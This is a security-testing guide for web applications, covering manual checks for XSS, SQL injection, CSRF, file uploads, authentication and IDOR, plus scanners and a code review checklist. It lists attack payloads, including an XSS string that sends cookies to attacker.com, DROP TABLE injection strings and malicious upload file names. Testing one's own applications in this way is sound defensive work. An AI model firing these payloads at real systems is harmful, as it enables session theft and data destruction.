# Security Testing

## Manual Testing

### XSS Testing

Try these payloads in every text input, URL parameter, and form field:
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
javascript:alert('XSS')
<img src="x" onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

For attribute contexts:
```
" onfocus="alert('XSS')" autofocus="
' onfocus='alert(1)' autofocus='
```

### SQL Injection Testing

Test input fields and API parameters with:
```
' OR '1'='1
' OR '1'='1' --
'; DROP TABLE users--
1' UNION SELECT NULL--
1' AND 1=1--
1' AND 1=2--
' WAITFOR DELAY '0:0:5'--
```

### CSRF Testing

- Submit a form from a different origin (create a simple HTML page on another domain)
- Check that state-changing requests require valid tokens
- Verify tokens are tied to the user session

### File Upload Testing

- Upload files with double extensions: `file.php.jpg`, `file.asp.png`
- Upload files with null bytes: `file.php%00.jpg`
- Upload executable files: `.php`, `.py`, `.sh`, `.exe`
- Upload oversized files beyond stated limits
- Upload files with manipulated MIME types (change Content-Type header)

### Authentication Testing

- Attempt access to protected resources without authentication
- Test session fixation: copy session cookie, login, check if old session works
- Test brute force: verify rate limiting on login endpoints
- Check that logout actually invalidates the session
- Test password reset flow for token reuse, timing attacks

### IDOR Testing

- Access resources by changing IDs in URLs: `/api/users/1` → `/api/users/2`
- Modify IDs in request bodies and hidden form fields
- Test with different user sessions to verify access controls

## Automated Scanning

### Python Security

```bash
# Bandit — static analysis for Python security issues
pip install bandit
bandit -r your_project/ -f json -o bandit-report.json

# Common findings: hardcoded passwords, use of eval(), insecure hash functions,
# subprocess with shell=True, etc.

# Safety — check dependencies for known vulnerabilities
pip install safety
safety check --json

# pip-audit — alternative dependency checker
pip install pip-audit
pip audit
```

### PHP Security

```bash
# PHPCS with security standards
composer require --dev squizlabs/php_codesniffer
vendor/bin/phpcs --standard=Security your_project/

# Psalm with security analysis
composer require --dev vimeo/psalm
vendor/bin/psalm --taint-analysis

# PHPStan
composer require --dev phpstan/phpstan
vendor/bin/phpstan analyse src/
```

### WordPress-Specific

```bash
# WPScan — vulnerability scanner
# Install: gem install wpscan
wpscan --url https://yoursite.com --enumerate vp,vt,u
# vp = vulnerable plugins, vt = vulnerable themes, u = users

# WordPress Coding Standards with security sniffs
composer require --dev wp-coding-standards/wpcs
vendor/bin/phpcs --standard=WordPress-Extra your-plugin/
```

### JavaScript/Node.js

```bash
# npm audit
npm audit
npm audit fix

# ESLint with security plugin
npm install --save-dev eslint-plugin-security
# .eslintrc: { "plugins": ["security"], "extends": ["plugin:security/recommended"] }

# Snyk
npm install -g snyk
snyk test
```

### Web Application Scanners

- **OWASP ZAP** — Free, open-source web app scanner. Good for automated scanning and manual testing.
- **Burp Suite** — Industry-standard security testing platform (Community edition is free).
- **Nikto** — Web server scanner for misconfigurations.
- **Mozilla Observatory** — Online tool to check security headers (observatory.mozilla.org).
- **SecurityHeaders.com** — Quick check of HTTP security headers.

### Dash-Specific Testing

```python
# Test that callbacks reject unexpected inputs
import requests

# Simulate a callback with malicious input
response = requests.post('http://localhost:8050/_dash-update-component', json={
    'output': 'output.children',
    'inputs': [{'id': 'dropdown', 'property': 'value', 'value': "'; DROP TABLE data;--"}],
    'changedPropIds': ['dropdown.value']
})
# Your callback should handle this safely

# Test that dcc.Store doesn't contain sensitive data
# Open browser DevTools > Application > Session Storage/Local Storage
# Check that no secrets, tokens, or PII are stored client-side
```

## Code Review Checklist

For every pull request, verify:

**Input/Output:**
- [ ] All user input sanitized before storage
- [ ] All output escaped for appropriate context (HTML, JS, SQL, URL)
- [ ] No direct echo/print of user data without escaping

**Database:**
- [ ] All queries use prepared statements or ORM
- [ ] No string concatenation/interpolation in SQL
- [ ] LIKE clause wildcards escaped

**Authentication/Authorization:**
- [ ] CSRF tokens on all state-changing forms
- [ ] Permission checks before sensitive operations
- [ ] Object-level access control (not just role checks)
- [ ] No passwords, tokens, or PII in logs or error messages

**Headers:**
- [ ] CSP header configured
- [ ] HSTS enabled
- [ ] X-Content-Type-Options: nosniff
- [ ] X-Frame-Options or CSP frame-ancestors set
- [ ] CORS restricted to required origins

**Sessions/Cookies:**
- [ ] HttpOnly, Secure, SameSite flags on auth cookies
- [ ] Session regenerated after login
- [ ] JWT expiration enforced, algorithm explicitly specified

**Files:**
- [ ] Upload type, size, and content validated server-side
- [ ] Filenames sanitized and randomized
- [ ] Files stored outside web root

**API:**
- [ ] Rate limiting on public endpoints
- [ ] Input validation (type, range, format, length) on all parameters
- [ ] Mass assignment protection (fillable/guarded fields)
- [ ] Error responses don't leak internals

**Configuration:**
- [ ] No hardcoded secrets
- [ ] Debug mode off in production
- [ ] Dependencies audited, lock file committed
- [ ] .env in .gitignore
